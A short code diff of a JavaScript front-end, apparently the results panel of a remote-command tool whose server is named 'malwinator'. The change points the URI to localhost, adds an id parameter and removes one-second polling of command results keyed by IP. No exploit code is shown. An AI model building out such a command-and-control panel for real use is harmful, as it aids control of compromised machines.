@@ -1,8 +1,9 @@
-// uri = "http://localhost:5000"
-uri = "https://malwinator.chickenkiller.com"
+uri = "http://localhost:5000"
+// uri = "https://malwinator.chickenkiller.com"
 // uri = "http://malwinator.chickenkiller.com"
-function fetchResult() {
-    path = "/getResult"
+function fetchResult(param) {
+    path = "/getResult?id="+param;
+    console.log(path);
     const paragraph = document.getElementById('command-result');
     const formData = new FormData();
     formData.append("ip", ip);
@@ -22,5 +23,3 @@ function fetchResult() {
             console.error('Error', error);
         })
 }
-
-setInterval(fetchResult, 1000);
